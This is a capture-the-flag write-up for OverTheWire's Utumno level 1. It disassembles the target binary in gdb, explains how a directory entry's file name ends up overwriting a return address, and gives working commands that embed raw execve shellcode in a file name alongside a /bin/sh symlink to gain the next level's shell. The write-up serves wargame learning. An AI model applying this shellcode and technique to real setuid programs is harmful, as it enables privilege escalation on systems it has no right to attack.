# Overthewire Utumno Level 1 Writeup

```bash
$ gdb ./utumno1 -q
Reading symbols from ./utumno1...done.
(gdb) disas main
Dump of assembler code for function main:
   0x080484a6 <+0>: push   %ebp
   0x080484a7 <+1>: mov    %esp,%ebp
   0x080484a9 <+3>: and    $0xfffffff0,%esp
   0x080484ac <+6>: sub    $0x20,%esp
   0x080484af <+9>: mov    0xc(%ebp),%eax
   0x080484b2 <+12>:  add    $0x4,%eax
   0x080484b5 <+15>:  mov    (%eax),%eax
   0x080484b7 <+17>:  test   %eax,%eax
   0x080484b9 <+19>:  jne    0x80484c7 <main+33>
   0x080484bb <+21>:  movl   $0x1,(%esp)
   0x080484c2 <+28>:  call   0x8048340 <exit@plt>
   0x080484c7 <+33>:  mov    0xc(%ebp),%eax
   0x080484ca <+36>:  add    $0x4,%eax
   0x080484cd <+39>:  mov    (%eax),%eax
   0x080484cf <+41>:  mov    %eax,(%esp)
   0x080484d2 <+44>:  call   0x8048380 <opendir@plt>
   0x080484d7 <+49>:  mov    %eax,0x18(%esp)
   0x080484db <+53>:  cmpl   $0x0,0x18(%esp)
   0x080484e0 <+58>:  jne    0x80484ee <main+72>
   0x080484e2 <+60>:  movl   $0x1,(%esp)
   0x080484e9 <+67>:  call   0x8048340 <exit@plt>
   0x080484ee <+72>:  jmp    0x8048522 <main+124>
   0x080484f0 <+74>:  mov    0x1c(%esp),%eax
   0x080484f4 <+78>:  add    $0xb,%eax
   0x080484f7 <+81>:  movl   $0x3,0x8(%esp)
---Type <return> to continue, or q <return> to quit---
   0x080484ff <+89>:  mov    %eax,0x4(%esp)
   0x08048503 <+93>:  movl   $0x80485d0,(%esp)
   0x0804850a <+100>: call   0x8048370 <strncmp@plt>
   0x0804850f <+105>: test   %eax,%eax
   0x08048511 <+107>: jne    0x8048522 <main+124>
   0x08048513 <+109>: mov    0x1c(%esp),%eax
   0x08048517 <+113>: add    $0xe,%eax
   0x0804851a <+116>: mov    %eax,(%esp)
   0x0804851d <+119>: call   0x804848d <run>
   0x08048522 <+124>: mov    0x18(%esp),%eax
   0x08048526 <+128>: mov    %eax,(%esp)
   0x08048529 <+131>: call   0x8048360 <readdir@plt>
   0x0804852e <+136>: mov    %eax,0x1c(%esp)
   0x08048532 <+140>: cmpl   $0x0,0x1c(%esp)
   0x08048537 <+145>: jne    0x80484f0 <main+74>
   0x08048539 <+147>: mov    $0x0,%eax
   0x0804853e <+152>: leave
   0x0804853f <+153>: ret
End of assembler dump.
(gdb) disas run
Dump of assembler code for function run:
   0x0804848d <+0>: push   %ebp
   0x0804848e <+1>: mov    %esp,%ebp
   0x08048490 <+3>: sub    $0x10,%esp
   0x08048493 <+6>: lea    -0x4(%ebp),%eax
   0x08048496 <+9>: add    $0x8,%eax
   0x08048499 <+12>:  mov    %eax,-0x4(%ebp)
   0x0804849c <+15>:  mov    -0x4(%ebp),%eax
   0x0804849f <+18>:  mov    0x8(%ebp),%edx
   0x080484a2 <+21>:  mov    %edx,(%eax)
   0x080484a4 <+23>:  leave
   0x080484a5 <+24>:  ret
End of assembler dump.
```

You give `utumno1` a dir, it recursively open files whose filename starts with `sh_` and passes the d_name of struct `dirent`(with offset 3) to function `run`.
The struct:

```c
struct dirent {
    ino_t          d_ino;       /* inode number */
    off_t          d_off;       /* offset to the next dirent */
    unsigned short d_reclen;    /* length of this record */
    unsigned char  d_type;      /* type of file; not supported
                                   by all file system types */
    char           d_name[256]; /* filename */
};
```

Function `run` uses the parameter to overwrite its return address. So I need to place the shellcode in the filename. Since Linux forbids any `0x2f` in the filename, we need a shellcode which does not have string `/bin/sh` in it. A soft link stands out to fullfill this task.

```bash
$ ln -s /bin/sh a
$ touch `python -c 'print "sh_\x31\xc0\x50\x6a\x61\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80"'`
$ ll
total 1192
drwxrwxr-x    2 utumno1 utumno1    4096 May 27 08:54 ./
drwxrwx-wt 4449 root    root    1118208 May 27 08:54 ../
lrwxrwxrwx    1 utumno1 utumno1       7 May 27 08:53 a -> /bin/sh*
-rw-------    1 utumno1 utumno1  385024 Apr 10 15:37 core
-rw-rw-r--    1 utumno1 utumno1       0 May 27 08:54 sh_1?Pja???P??Y??
-r-xr-x---    1 utumno1 utumno1    6799 Apr 10 15:10 utumno1*
$ /utumno/utumno1 .
$ whoami
utumno2
```

The shellcode is from (shellstorm)[http://shell-storm.org/shellcode/files/shellcode-589.php].
